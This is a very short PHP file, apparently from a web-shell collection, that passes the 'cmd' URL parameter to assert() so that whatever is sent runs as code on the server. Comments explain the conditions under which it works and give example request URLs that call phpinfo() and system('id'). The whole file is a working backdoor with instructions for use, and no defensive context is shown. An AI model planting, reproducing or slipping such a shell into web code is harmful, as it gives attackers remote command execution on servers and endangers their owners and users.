# This will only work if the assert() function is enabled
# and if the assert() function is configured to allow code execution.
# Execution: http://example.com/webshell_assert.php?cmd=phpinfo(); ?cmd=system('id');

<?php assert($_GET['cmd']); ?>